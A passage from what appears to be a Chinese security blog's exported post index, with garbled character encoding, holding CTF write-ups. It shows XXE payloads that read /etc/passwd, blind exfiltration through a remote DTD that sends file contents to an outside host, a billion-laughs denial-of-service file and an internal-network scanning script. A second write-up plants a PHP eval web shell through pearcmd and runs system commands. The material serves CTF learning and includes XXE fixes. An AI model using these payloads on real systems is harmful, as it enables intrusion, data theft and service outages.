(#PCDATA)>\t\t\t\t//DTDæ–‡æ¡£å®šä¹‰ç±»å‹\n  <!ELEMENT heading (#PCDATA)>\n  <!ELEMENT body    (#PCDATA)>\n]>\n\n<note>\n<to>George</to>\n<from>John</from>\t\t\t\t\t\t\t//æ–‡æ¡£å…ƒç´ ï¼Œå…ƒç´ æ˜¯è‡ªç”±è®¾å®šçš„ã€‚\n<heading>Reminder</heading> \t\t\t\t//ä½†æ˜¯ä¸€å®šè¦æœ‰æ ¹å…ƒç´ å’Œåˆ†æ”¯ï¼Œå¹¶ä¸”æ­£ç¡®åµŒå¥—\n<body>Don't forget the meeting!</body>\n</note>\n\n```\n\n### DTDï¼ˆæ–‡æ¡£å®šä¹‰ç±»å‹ï¼‰-å®ä½“\n\n**å®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ã€‚**\n\n**å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚**\n\n**å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ã€‚**\n\n##### ä½œç”¨æ˜¯å®šä¹‰XMLæ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ï¼Œå¯å†…éƒ¨å£°æ˜ï¼Œä¹Ÿå¯å¤–éƒ¨å¼•ç”¨ï¼Œè¿™ä¸ªä¹Ÿæ˜¯å¤–éƒ¨å®ä½“æ³¨å…¥çš„å…³é”®åœ°æ–¹\n\n#### å†…éƒ¨å®ä½“çš„å£°æ˜\n\n```dtd\nè¯­æ³•ï¼š\n<!ENTITY å®ä½“åç§° \"å®ä½“çš„å€¼\">\n\nDTDä¸­ï¼š\nä¾‹å­ï¼š\n<!ENTITY writer \"Bill Gates\">\n<!ENTITY copyright \"Copyright W3School.com.cn\">\n\nXMLä¸­ï¼š\nä¸€ä¸ªå®ä½“ç”±ä¸‰éƒ¨åˆ†æ„æˆ: ä¸€ä¸ªå’Œå· (&), ä¸€ä¸ªå®ä½“åç§°, ä»¥åŠä¸€ä¸ªåˆ†å· (;)ã€‚\nä¾‹å­;\n<author>&writer;&copyright;</author>\n```\n\n#### å¤–éƒ¨å®ä½“å£°æ˜\n\n```dtd\nè¯­æ³•:\n<!ENTITY å®ä½“åç§° SYSTEM \"URI/URL\">\n\nDTDä¸­ï¼š\nä¾‹å­ï¼š\n<!ENTITY writer SYSTEM \"http://www.baidu.com.cn/dtd/entities.dtd\">\n<!ENTITY copyright SYSTEM \"http://www.w3school.com.cn/dtd/entities.dtd\">\n\nXMLä¸­ï¼š\nä¾‹å­ï¼š\n<author>&writer;&copyright;</author>\n\næˆ–è€…\n<!ENTITY å®ä½“åç§° PUBLIC \"public_ID\" \"URI\">\n```\n\n### XMLå¤–éƒ¨å®ä½“æ³¨å…¥\n\nå½“å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œç”±äºXMLæ³¨é‡äºæ•°æ®çš„ä¼ è¾“ï¼Œæ‰€ä»¥é€šè¿‡æ„é€ æ¶æ„å†…å®¹ï¼Œå¯å¯¼è‡´è¯»å–ä»»æ„æ–‡ä»¶ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€æ¢æµ‹å†…ç½‘ç«¯å£ã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚\n\n#### æ–¹å¼1:\n\n#### é€šè¿‡åè®®æ¥å¼•ç”¨ï¼Œä¸è¿‡ä¸åŒçš„ç¨‹åºæ”¯æŒçš„åè®®ä¸ä¸€æ ·\n\n#### ![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407091426966.png)\n\n```xml-dtd\n<?xml version=\"1.0\"?>\n<!DOCTYPE test[\n    <!ENTITY Y SYSTEM \"file:///etc/passwd\">\n    ]>\n<user>&Y</user>\n//ä¸Šä¼ è¯¥æ–‡ä»¶å°±ä¼šè¿”å›/etc/passwdçš„å†…å®¹\n```\n\n#### æ–¹å¼2ï¼š\n\n```xml-dtd\n<?xml version=\"1.0\"?>\n<!DOCTYPE test[\n    <!ENTITY Y SYSTEM \"http://www.baidu.com\">\n    ]>\n<user>&Y</user>\n```\n\n#### æ–¹å¼3ï¼ˆæ•°æ®å¤–å¸¦---åœ¨xxeçš„ç›²æ³¨ä¸­å¯ä»¥ä½¿ç”¨ï¼‰ï¼š\n\n```xml-dtd\n<!DOCTYPE root [   \n<!ENTITY % remote SYSTEM \"http://174.1.66.167/shell.dtd\">  \n%remote;  \n]>  \n  \nshell.dtd  \n<!ENTITY % file SYSTEM \"file:///flag\">  \n<!ENTITY % int \"<!ENTITY &#37; send SYSTEM 'http://127.0.0.1:5555/?flag=%file;'>\">  \n%int;  \n%send;\n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407091658763.png)\n\n#### æ–¹å¼4ï¼ˆå†…éƒ¨DTD+å‚æ•°å¤–éƒ¨å®ä½“ï¼‰ï¼š\n\n```xml-dtd\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<!DOCTYPE a[\n<!ENTITY %name SYSTEM \"file:///etc/passwd\">\n%name;\n]>\n//æ³¨æ„ï¼š%nameï¼ˆå‚æ•°å®ä½“ï¼‰æ˜¯åœ¨ DTD ä¸­è¢«å¼•ç”¨çš„ï¼Œè€Œ&nameï¼ˆå…¶ä½™å®ä½“ï¼‰å®åœ¨ xml æ–‡æ¡£ä¸­è¢«å¼•ç”¨\nçš„ã€‚\n```\n\n#### ç»•è¿‡æ‰‹æ³•\n\n```xml-dtd\nåŒé‡å®ä½“ç¼–ç ç»•è¿‡\n<?xml version=\"1.0\"?>  \n  \n<!DOCTYPE GVI [  \n  \n    <!ENTITY % xml \"&#60;&#33;&#69;&#78;&#84;&#73;&#84;&#89;&#32;&#120;&#120;&#101;&#32;&#83;&#89;&#83;&#84;&#69;&#77;&#32;&#34;&#102;&#105;&#108;&#101;&#58;&#47;&#47;&#47;&#102;&#108;&#97;&#103;&#46;&#116;&#120;&#116;&#34;&#32;&#62;&#93;&#62;&#10;&#60;&#99;&#111;&#114;&#101;&#62;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#60;&#109;&#101;&#115;&#115;&#97;&#103;&#101;&#62;&#38;&#120;&#120;&#101;&#59;&#60;&#47;&#109;&#101;&#115;&#115;&#97;&#103;&#101;&#62;&#10;&#60;&#47;&#99;&#111;&#114;&#101;&#62;\">  \n  \n    %xml;\n\nç¼–ç å†…å®¹:\n<!ENTITY xxe SYSTEM \"file:///flag.txt\" >]>  \n<core>  \n      <message>&xxe;</message>  \n</core>\n```\n\n#### æ‹’ç»æœåŠ¡æ”»å‡»ä»£ç \n\n```xml-dtd\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [ \n<!ENTITY lol \"lol\"> \n<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"> \n<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\"> <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\"> <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\"> <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\"> <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\"> <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\"> <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n]> \n<lolz>&lol9;</lolz>\n<--XMLè§£æå™¨å°è¯•è§£æè¯¥æ–‡ä»¶æ—¶ï¼Œç”±äºDTDçš„å®šä¹‰æŒ‡æ•°çº§å±•å¼€ï¼ˆå³é€’å½’å¼•ç”¨),ä¸¾ä¸ªä¾‹å­ï¼Œè¿™é‡Œå®šä¹‰äº†ä¸€ä¸ªlolçš„å®ä½“ï¼Œå®ä½“è¿˜æœ‰â€œlolâ€çš„å­—ç¬¦ä¸²ï¼Œç„¶åå®šä¹‰äº†ä¸€ä¸ªlol2çš„å®ä½“ï¼Œé‡Œé¢æœ‰10ä¸ª\"lol\"çš„å­—ç¬¦ä¸²ï¼Œä¾æ¬¡é€’æ¨ï¼Œä¸€ä¸ªlol3å®ä½“å¼•ç”¨10ä¸ªlol2å®ä½“ï¼Œè¿™æ ·çš„è¯å¯ä»¥ä¸€ç›´å‘æœåŠ¡å™¨ä¼ è¾“æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯å½¢æˆäº†DOSæ”»å‡»ï¼Œç»è¿‡XMLè§£æå™¨è§£æåçš„å†…å­˜å ç”¨ä¼šæ¯”å…¶æœ¬èº«å¤§çš„å¤šã€‚-->\n```\n\n### å†…ç½‘æ‰«æ\n\n```xml-dtd\n<?xml version=\"1.0\" ?>\n<!DOCTYPE xxe[\n<!ENTITY xxe SYSTEM \"file://proc/net/fib_trie\">\n<user>&xxe</user>\n]>\nfile:///etc/hosts å‚¨å­˜åŸŸåè§£æçš„ç¼“å­˜\n\nfile:///proc/net/arp arpè¡¨ï¼Œå¯ä»¥è·å¾—å†…ç½‘å…¶ä»–æœºå™¨çš„åœ°å€\n\nfile:///proc/net/tcp\n\nfile:///proc/net/udp\n\nfile:///proc/net/dev\n\nfile:///proc/net/fib_trie è·¯ç”±ç¼“å­˜\n\nfile:///etc/passwd ç”¨æˆ·å¯†ç \n\n```\n\n### å†…ç½‘æ‰«æè„šæœ¬ï¼ˆå€Ÿç”¨[å¤§ä½¬çš„è„šæœ¬](https://www.cnblogs.com/Article-kelp/p/16026652.html)ï¼‰\n\n```python\n\nimport requests as res\nurl=\"http://185729a2-949c-44fb-ac39-c16282525e73.node5.buuoj.cn:81/doLogin.php\"\nrawPayload='<?xml version=\"1.0\"?>'\\\n         '<!DOCTYPE note ['\\\n         '<!ENTITY payload SYSTEM \"http://10.244.80.{}\">'\\\n         ']>'\\\n         '<user>'\\\n         '<username>'\\\n         '&payload;'\\\n         '</username>'\\\n         '<password>'\\\n         '123'\\\n         '</password>'\\\n         '</user>'\nfor i in range(1,256):\n    payload=rawPayload.format(i)\n    #payload=rawPayload\n    print(str(\"#{} =>\").format(i),end='')\n    try:\n        resp=res.post(url,data=payload,timeout=0.5)\n    except:\n        continue\n    else:\n        print(resp.text,end='')\n    finally:\n        print('')\n```\n\n### ä¿®å¤æ–¹æ¡ˆ\n\n```\nxxeä¿®å¤\n\næ–¹æ¡ˆï¼šä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•\n\n1.PHPï¼š\nlibxml\\_disable\\_entity\\_loader(true);//è®¾ç½®ä¸ºtrueæ—¶ç¦æ­¢è§£æxmlå¤–éƒ¨å®ä½“\n\n2.JAVA:\nDocumentBuilderFactory dbf=DocumentBuilderFactory.newInstance();\ndbf.setExpandEntityReferences(false);\n\n3.Pythonï¼š\nfrom lxml import etree\nxmlData=etree.parse(xmlSource,etree.XMLParser(resolve\\_entities=False))\n```\n\n\n\n## å‚è€ƒæ–‡ç« ï¼š\n\n[XXEæ¼æ´-å†ç®€å•ä¸€ç‚¹ç‚¹](https://www.cnblogs.com/happystudyhuan/p/11774626.html)\n\n[æœªçŸ¥æ”»ç„‰çŸ¥é˜²â€”â€”XXEæ¼æ´æ”»é˜²](https://security.tencent.com/index.php/blog/msg/69)\n\n[XXEå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´â€”â€”PHP](https://blog.51cto.com/u_13953961/3107472)\n\n[php xxeæ³¨å…¥,XXEçš„åŸç†åˆ©ç”¨æ–¹å¼åŠä¿®å¤](https://blog.csdn.net/weixin_26750831/article/details/115201337?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172050770116800211510330%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=172050770116800211510330&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-6-115201337-null-null.142^v100^pc_search_result_base2&utm_term=php%20xxe&spm=1018.2226.3001.4187)\n\n[æ¸—é€æ”»å‡»é›¶åŸºç¡€å­¦ä¹ -XXEï¼ˆéå¸¸è¯¦ç»†ï¼‰é›¶åŸºç¡€å…¥é—¨åˆ°ç²¾é€šï¼Œæ”¶è—è¿™ä¸€ç¯‡å°±å¤Ÿäº†ï¼ï¼ï¼](https://blog.csdn.net/logic1001/article/details/136590382?ops_request_misc=&request_id=&biz_id=102&utm_term=php%20xxe&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-136590382.142^v100^pc_search_result_base2&spm=1018.2226.3001.4187)\n\n[BUUCTFé¢˜è§£ NCTF2019 True XML cookbook--Article](https://www.cnblogs.com/Article-kelp/p/16026652.html)\n\n[[NCTF2019]True XML cookbook 1-peekaboo](https://peekaboo.show/untitled-7/)\n\n[XXEæ¼æ´-å†…ç½‘æ¢æµ‹](https://blog.csdn.net/weixin_43221560/article/details/108152738)\n\n","tags":["-xxe"]},{"title":"[NewStarCTF 2023 å…¬å¼€èµ›é“]Include ğŸ--LFI to RCE","url":"/2024/07/10/NewStarCTF-2023-å…¬å¼€èµ›é“-Include-ğŸ-LFI-to-RCE/","content":"\n# [NewStarCTF 2023 å…¬å¼€èµ›é“]Include ğŸ\n\nä¸Šæ¥çœ‹åˆ°æºç å¦‚ä¸‹\n\n```php\n <?php\n    error_reporting(0);\n    if(isset($_GET['file'])) {\n        $file = $_GET['file'];\n        \n        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {\n            die('hacker!');\n        }\n        \n        include($file.\".php\");\n        # Something in phpinfo.php!\n    }\n    else {\n        highlight_file(__FILE__);\n    }\n?> \n```\n\nä¼ ä¸€ä¸ªphpinfoçœ‹çœ‹æ˜¯ä»€ä¹ˆ\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101549638.png)\n\nä¸€ä¸ªå‡çš„flagï¼Œä¸è¿‡è¿™æ˜¯ä¸ªæç¤ºï¼Œé‚£æˆ‘ä»¬çœ‹ä¸€ä¸‹register_argc_argvæ˜¯ä»€ä¹ˆç©æ„\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101552331.png)\n\nå¼€å¯çŠ¶æ€ï¼Œé‚£æˆ‘å°±å¾—æŸ¥æŸ¥èµ„æ–™äº†ï¼Œè¿™ä¸ªregister_argc_argvçš„ä½œç”¨\n\nç›´æ¥æ”¾æ–‡ç« é“¾æ¥ï¼šhttps://cloud.tencent.com/developer/article/2204400     https://www.cnblogs.com/Yu--/p/15788689.html      https://blog.csdn.net/weixin_53090346/article/details/127241278\n\nè¿™ä¸ªä¸»è¦æ˜¯ç”¨çš„æ˜¯åŒ…å«pearcmd.phpè¿™ä¸ªæ–‡ä»¶æ¥æ‰§è¡Œå‘½ä»¤ï¼Œç„¶åå€Ÿç”¨å¤§ä½¬çš„å›¾å“ˆ\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101557767.png)\n\nå¯ä»¥çœ‹åˆ°ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªconfig-createå‚æ•°ï¼Œè¿™ä¸ªå°±æ˜¯å»åˆ›å»ºæ–‡ä»¶çš„å‘½ä»¤ï¼Œä¸è¿‡è¦ç”¨+æ¥éš”å¼€ï¼ˆåº•å±‚åŸå› ï¼šhttps://xz.aliyun.com/t/11089?time__1311=Cq0x2Qi%3Domq7qGNDQieiKO%2BmjowcGAbD#toc-0ï¼‰\n\n```php\næ‰€ä»¥ï¼Œæ„é€ æˆ‘ä»¬çš„payload\n?file=/usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_POST['a'])?>+./a.php\nä¸åŒçš„ç³»ç»Ÿpearcmdå­˜æ”¾çš„ä½ç½®å¥½åƒä¸ä¸€å®šï¼Œ æœ‰çš„åœ¨/usr/share/php/pearcmd.phpã€‚\n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101614305.png)\n\næ³¨æ„ï¼šç”¨BPè¿›è¡Œæ“ä½œï¼Œä¸ç„¶åœ¨æµè§ˆå™¨ä¸­<>å°±ä¼šè¢«URLç¼–ç ï¼Œå°±ä¼šå¯¼è‡´æˆ‘ä»¬çš„é©¬ä¸ç®¡ç”¨äº†\n\nç„¶åï¼ŒPOSTä¼ å…¥æ‰§è¡Œå‘½ä»¤\n\n```php\n?file=./a\nPOST:a=system(\"cat /f*\");\n```\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202407101621878.png)\n\næœ¬é¢˜è€ƒæŸ¥çš„æ˜¯LFIæ–‡ä»¶åŒ…å«å’ŒRCEçš„ç»“åˆï¼Œå…³é”®ç‚¹æ˜¯åœ¨pearcmd.phpä¸Šï¼Œä¸è¿‡è¿™ç§ä½¿ç”¨æ–¹æ³•åªèƒ½æ˜¯register_argc_argvå¼€å¯çŠ¶æ€æ‰è¡Œã€‚ä¸è¿‡å¦‚æœå¯ä»¥ä¸Šä¼ æ–‡ä»¶çš„è¯ï¼Œå¯ä»¥è¿›è¡Œä¸Šä¼ å®¹å™¨é…ç½®æ–‡ä»¶æ¥æ”¹å˜å…³é—­çŠ¶æ€ï¼ˆå‚è€ƒï¼šhttps://cloud.tencent.com/developer/article/2204400ï¼‰\n\nå½“ç„¶ï¼ŒLFIå¯ä»¥åšçš„äº‹è¿˜å¾ˆå¤šæ¯”å¦‚è¿˜å¯ä»¥ææƒï¼ˆå‚è€ƒæ–‡ç« :https://www.freebuf.com/articles/web/253102.htmlï¼‰","tags":["LFI","RCE"]},{"title":"[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp4-Rceme WP","url":"/2024/06/05/æå®¢å¤§æŒ‘æˆ˜-2020-Roamphp4-Rceme-WP/","content":"\n# [æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp4-Rceme\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042050251.png)\n\nè¿›å…¥é¢˜ç›®ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯å¦‚æœcodeçš„md5å€¼å‰5ä½æ˜¯3e16bï¼Œé‚£ä¹ˆå°±ä¼šæ‰§è¡Œå‘½ä»¤\n\nè¿™è¾¹ç»™å‡ºä¸€ä¸ªmd5ç”Ÿæˆè„šæœ¬\n\n```python\nimport hashlib\n\ni = 0\nwhile True:\n    if hashlib.md5(str(i).encode('utf-8')).hexdigest()[0:5] == '0e788':\n        print(i)\n        break\n    i = i + 1\n```\n\næŸ¥çœ‹æºç ï¼Œå‘ç°æç¤º\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042051889.png)\n\n```sh\nvim swpï¼Œ.swpæ–‡ä»¶æ˜¯vimä½¿ç”¨ä¸å½“è€Œç”Ÿæˆçš„ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™ç§æ–‡ä»¶ä¸€èˆ¬éƒ½æ˜¯â€œåçš„â€ï¼ŒæŸ¥çœ‹åŸæ¥å†…å®¹éœ€è¦vim -r\nè¦ç›´æ¥ç”¨ Vim æ‰“å¼€ä¸€ä¸ª .swp æ–‡ä»¶ï¼Œä½ å¯ä»¥é‡‡å–ä»¥ä¸‹æ­¥éª¤ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œ.swp æ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç›´æ¥ç¼–è¾‘å®ƒå¹¶ä¸å¸¸è§ï¼Œä½†ä½ å¯èƒ½ä¼šå¸Œæœ›æŸ¥çœ‹å…¶å†…å®¹ã€‚\n\n1. æ‰“å¼€ .swp æ–‡ä»¶\nä½ å¯ä»¥ç”¨ vim å‘½ä»¤ç›´æ¥æ‰“å¼€ .swp æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼š\nvim example.txt.swp\n\n2. ä½¿ç”¨ :recover å‘½ä»¤æ¢å¤æ–‡ä»¶\nå¦‚æœä½ çš„ç›®çš„æ˜¯ä»äº¤æ¢æ–‡ä»¶ä¸­æ¢å¤æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ :recover å‘½ä»¤ã€‚å‡è®¾ä½ æœ‰ä¸€ä¸ªäº¤æ¢æ–‡ä»¶ example.txt.swpï¼Œä½ å¯ä»¥è¿™æ ·åšï¼š\nvim -r example.txt\n\n3. æ‰‹åŠ¨æ‰“å¼€ .swp æ–‡ä»¶æŸ¥çœ‹å†…å®¹\nå¦‚æœä½ åªæƒ³æŸ¥çœ‹ .swp æ–‡ä»¶çš„å†…å®¹ï¼Œå°½ç®¡å®ƒæ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½ å¯ä»¥ä½¿ç”¨ Vim çš„äºŒè¿›åˆ¶æ¨¡å¼æ¥æŸ¥çœ‹ã€‚æ³¨æ„ï¼Œè¿™ä¸æ˜¯å¸¸è§æ“ä½œï¼Œè€Œä¸”é€šå¸¸ä¸ä¼šæœ‰å¾ˆå¥½çš„é˜…è¯»ä½“éªŒï¼Œä½†å¯ä»¥å¸®åŠ©ä½ æ£€æŸ¥äº¤æ¢æ–‡ä»¶çš„ä¸€äº›ç»†èŠ‚ã€‚æ­¥éª¤å¦‚ä¸‹ï¼š\nvim -b example.txt.swp\n\nåœ¨ Vim ä¸­ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥åˆ‡æ¢åˆ°åå…­è¿›åˆ¶æ¨¡å¼ï¼Œè¿™æ ·ä½ å¯ä»¥æ›´æ–¹ä¾¿åœ°æŸ¥çœ‹äºŒè¿›åˆ¶å†…å®¹ï¼š\n:%!xxd\n\nè¦è¿”å›æ™®é€šæ¨¡å¼ï¼Œå¯ä»¥ä½¿ç”¨ï¼š\n:%!xxd -r\n\n4. ä½¿ç”¨ xxd æŸ¥çœ‹ .swp æ–‡ä»¶\nä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ xxd å‘½ä»¤æ¥æŸ¥çœ‹ .swp æ–‡ä»¶çš„å†…å®¹ï¼š\nxxd example.txt.swp | less\nè¿™ä¼šå°† .swp æ–‡ä»¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ˜¾ç¤ºï¼Œä¾¿äºæŸ¥çœ‹ã€‚\n\n5. ç¡®å®šå¦‚ä½•å¤„ç† .swp æ–‡ä»¶\nå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä½ éœ€è¦æ ¹æ® Vim çš„æç¤ºæ¥å†³å®šå¦‚ä½•å¤„ç† .swp æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œå½“ä½ å°è¯•æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼ŒVim ä¼šæç¤ºäº¤æ¢æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œå¹¶ç»™å‡ºå‡ ç§å¤„ç†é€‰é¡¹ï¼š\n\nO: åªè¯»æ‰“å¼€æ–‡ä»¶ã€‚\nE: ç»§ç»­ç¼–è¾‘æ–‡ä»¶ï¼Œå¿½ç•¥äº¤æ¢æ–‡ä»¶ã€‚\nR: æ¢å¤æ–‡ä»¶ï¼Œå°è¯•ä»äº¤æ¢æ–‡ä»¶ä¸­æ¢å¤æ•°æ®ã€‚\nD: åˆ é™¤äº¤æ¢æ–‡ä»¶ï¼Œé€šå¸¸åœ¨ç¡®è®¤æ²¡æœ‰å…¶ä»– Vim å®ä¾‹åœ¨ç¼–è¾‘è¯¥æ–‡ä»¶æ—¶ä½¿ç”¨ã€‚\nQ: é€€å‡ºï¼Œä¸è¿›è¡Œä»»ä½•æ“ä½œã€‚\nA: ä¸­æ­¢æ“ä½œï¼Œç±»ä¼¼äºé€€å‡ºã€‚\né€‰æ‹©é€‚å½“çš„é€‰é¡¹ï¼Œå¤„ç†äº¤æ¢æ–‡ä»¶åå†ç»§ç»­ç¼–è¾‘ä¸»æ–‡ä»¶ã€‚\n\né€šè¿‡è¿™äº›æ–¹æ³•ï¼Œä½ å¯ä»¥ç”¨ Vim æ‰“å¼€å’ŒæŸ¥çœ‹ .swp æ–‡ä»¶ã€‚è¦ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼Œ.swp æ–‡ä»¶ä¸»è¦ç”¨äº Vim çš„æ•°æ®æ¢å¤ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸å»ºè®®ç›´æ¥ç¼–è¾‘å®ƒä»¬ï¼Œè€Œæ˜¯é€šè¿‡æ¢å¤å’Œå¤„ç†çš„æ–¹å¼è¿›è¡Œæ“ä½œã€‚\n```\n\nç„¶åï¼Œæˆ‘ä»¬ç›´æ¥è®¿é—®/.index.php.swp\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042053910.png)\n\nåœ¨kaliä¸­æ‰“å¼€ vim -r index.php.swp\n\n![img](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042051195.png)\n\næºç å¦‚ä¸Š\n\n```\nsubstr(md5(mt_rand() . sha1(mt_rand())), 0, 5) æ˜¯ä¸€æ®µ PHP ä»£ç ï¼Œç”¨äºç”Ÿæˆä¸€ä¸ªé•¿åº¦ä¸º 5 çš„éšæœºå­—ç¬¦ä¸²ã€‚ä¸‹é¢æ˜¯è¿™æ®µä»£ç çš„å…·ä½“è§£æï¼š\n\nmt_rand():\n\nmt_rand() æ˜¯ä¸€ä¸ªç”Ÿæˆéšæœºæ•´æ•°çš„å‡½æ•°ï¼ŒåŸºäº Mersenne Twister ç®—æ³•ï¼Œæ¯” rand() æ›´å¿«å¹¶ä¸”æä¾›æ›´é«˜çš„éšæœºæ€§ã€‚\nè¯¥å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªä»‹äº 0 å’Œ RAND_MAX ä¹‹é—´çš„éšæœºæ•´æ•°ã€‚\nsha1(mt_rand()):\n\nç”Ÿæˆä¸€ä¸ªéšæœºæ•´æ•°ï¼Œç„¶åè®¡ç®—å…¶ SHA-1 å“ˆå¸Œå€¼ã€‚\nSHA-1 å“ˆå¸Œå€¼æ˜¯ä¸€ä¸ª 40 å­—ç¬¦çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚\nè¿æ¥éšæœºå€¼å’Œ SHA-1 å“ˆå¸Œå€¼:\n\nmt_rand() . sha1(mt_rand()) ç”Ÿæˆä¸¤ä¸ªéšæœºæ•´æ•°ï¼Œå¹¶å°†å®ƒä»¬çš„å€¼è¿æ¥èµ·æ¥ã€‚\nmd5():\n\nå¯¹è¿æ¥åçš„å­—ç¬¦ä¸²è®¡ç®—å…¶ MD5 å“ˆå¸Œå€¼ã€‚\nMD5 å“ˆå¸Œå€¼æ˜¯ä¸€ä¸ª 32 å­—ç¬¦çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚\nsubstr():\n\nä»ç”Ÿæˆçš„ MD5 å“ˆå¸Œå€¼ä¸­æå–å‰ 5 ä¸ªå­—ç¬¦ã€‚\nç»„åˆèµ·æ¥ï¼Œä»£ç çš„å…·ä½“æ‰§è¡Œé¡ºåºå¦‚ä¸‹ï¼š\n\nè°ƒç”¨ mt_rand() ç”Ÿæˆä¸€ä¸ªéšæœºæ•´æ•°ã€‚\nè°ƒç”¨ sha1() ç”Ÿæˆå¦ä¸€ä¸ªéšæœºæ•´æ•°çš„ SHA-1 å“ˆå¸Œå€¼ã€‚\nå°†è¿™ä¸¤ä¸ªå€¼è¿æ¥èµ·æ¥å½¢æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚\nè®¡ç®—è¿™ä¸ªå­—ç¬¦ä¸²çš„ MD5 å“ˆå¸Œå€¼ã€‚\nä» MD5 å“ˆå¸Œå€¼ä¸­æå–å‰ 5 ä¸ªå­—ç¬¦ã€‚\nå› æ­¤ï¼Œä»£ç 